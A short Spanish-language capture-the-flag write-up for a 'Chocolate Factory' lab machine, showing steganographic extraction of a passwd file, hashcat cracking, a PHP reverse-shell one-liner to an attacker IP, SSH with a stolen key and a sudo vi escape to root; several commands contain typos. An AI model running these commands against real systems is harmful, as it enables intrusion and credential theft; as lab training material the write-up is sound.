# Chocolate Factory

![](../../assets/img/Pasted_image_20251029090823.png)

![](../../assets/img/Pasted_image_20251029084613.png)

Vemos que el archivo tiene un b64.txt incrustado:
`steghide info gum_room.jpg`

![](../../assets/img/Pasted_image_20251029103900.png)

Con salvoconducto vacío podemos extraer el b64.txt que está cifrado en base64
`steghide extract -sf gum_room_jpg`

![](../../assets/img/Pasted_image_20251029104236.png)

Al decodificar en base64 el contenido del archivo, vemos una versión de /etc/passwd en la que se muestra la contraseña del usuario charlie

![](../../assets/img/Pasted_image_20251029104752.png)

Intenamos hashearla con hashcat

![](../../assets/img/Pasted_image_20251029105259.png)

`hashcat -a 0 -m 1800 hash_pswd_charlie.txt /usr/share/wordlists/rockyou.txt`

![](../../assets/img/Pasted_image_20251029111551.png)

**cn7824**

## Vulnerar sin el png

Se pueden ejecutar comandos en /home.php

![](../../assets/img/Pasted_image_20251029085317.png)

Lanzamos una revshell pero no nos deja de forma común, lanzo con php
`php -r '$sock=fsockopen("10.8.63.150",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
**www-data**

en key_rev_key

![](../../assets/img/Pasted_image_20251029093044.png)

Si hacemos file para ver que tipo de archivo es vemos que es un ejecutable pero no tenemos permisos para ejecutarlo

Vemos rsa key en el home de charlie

![](../../assets/img/Pasted_image_20251029101926.png)

`ssh charlie@10.10.85.252 -i id_rsa_charlie`
**charlie**

(ALL : !root) NOPASSWD: /ur/bin/vi
`su -u root vi`
`:!sh`
**root**

Para conseguir la flag he tenido que eliminar los print de YOU ARE DE OWNER OF porque la función que usa no había forma de que funcionara con python3
